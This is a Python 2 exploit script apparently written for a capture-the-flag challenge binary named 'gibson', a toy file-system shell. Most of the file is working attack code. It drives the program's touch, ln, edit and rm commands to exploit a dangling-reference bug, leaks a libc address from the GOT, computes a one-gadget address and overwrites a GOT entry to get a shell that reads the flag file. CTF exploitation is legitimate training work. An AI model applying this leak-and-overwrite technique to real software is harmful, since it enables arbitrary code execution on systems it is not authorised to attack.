import subprocess, os
import struct
import time

#p = process("./gibson", env={'LD_PRELOAD':'./libc-2.19.so'})
#env = os.environ
#env['LD_PRELOAD'] = './libc-2.19.so'
p = subprocess.Popen("/opt/chal/gibson", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

#p = process("./gibson")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

libc_puts = 0x0006fd60 #libc-2.19

# gdb.attach(p, """
# b *0x401725
# """)

def p64(x):
   return struct.pack('<Q', x)

def u64(x):
   return struct.unpack('<Q', x)[0]

def recvuntil(thingy):
   #read = p.stdout.readline()
   read = p.stdout.read(1)
   buf = read
   while buf.find(thingy) == -1:
       read = p.stdout.read(1)
       buf += read
   print("receiving {}".format(buf))
   return buf

def sendline(thingy):
   print("emitting {}".format(thingy))
   p.stdin.write(thingy + "\n")

def cat(name):
   sendline("cat")
   print "cat"
   print recvuntil("?")
   sendline(name)
   print name
   resp = recvuntil(">")
   return resp


def touch(name, size, data):
   sendline("touch")
   print "touch"
   print recvuntil("?")
   sendline(name)
   print name
   print recvuntil("?")
   sendline(size)
   print size
   print recvuntil(":")
   sendline(data)
   print data
   print recvuntil(">")

def ln(fileName, symlinkName):
   sendline("ln")
   print "ln"
   print recvuntil("?")
   sendline(fileName)
   print fileName
   print recvuntil("?")
   sendline(symlinkName)
   print symlinkName
   print recvuntil(">")

def edit(fileName, data):
   sendline("edit")
   print "edit"
   print recvuntil("?")
   sendline(fileName)
   print fileName
   print recvuntil(":")
   sendline(data)
   print data
   print recvuntil(">")

def ls():
   sendline("ls")
   print recvuntil(">")

def rm(fileName):
   sendline("rm")
   print "rm"
   print recvuntil("?")
   sendline(fileName)
   print fileName
   print recvuntil(">")

def jaime():
   print recvuntil(">")
   touch("a", "20", "A"*18)
   touch("b", "20", "B"*18)
   touch("c", "20", "C"*18)
   ln("a", "sim")
   edit("a", "B"*18)
   print cat("sim")[:300]
   rm("a")
   touch("d", "20", "D"*18)
   edit('d', 'D'*18)
   print cat("d")[:300]
   print cat("sim")

def main():
   touch("a", str(0x8), "A"*0x8)
   ln("a", "A")
   rm("A")
   ln("a", p64(0x603020) + p64(8))

   puts = cat("a")[1:8]
   print("puts: {}".format(puts))
   puts = u64(puts + "\x00"*(8-len(puts)))
   print("puts: {0:#010x}".format(puts))
   #print("libc.symbols['puts']: {0:#010x}".format(libc.symbols['puts']))
   #base = puts - libc.symbols['puts']
   base = puts - libc_puts
   print("base: {0:#010x}".format(base))
   magic = base + 0x4647c
   print("magic: {0:#010x}".format(magic))

   touch("z", str(0x8), "A"*0x8)
   ln("z", "Z")
   rm("Z")
   ln("z", p64(0x603038) + p64(8))
   edit("z", p64(magic))
   sendline("cat /opt/chal/flag.txt")
   time.sleep(2)
   #sendline("whoami")
   p.stdout.readline()
   p.stdout.readline()

main()
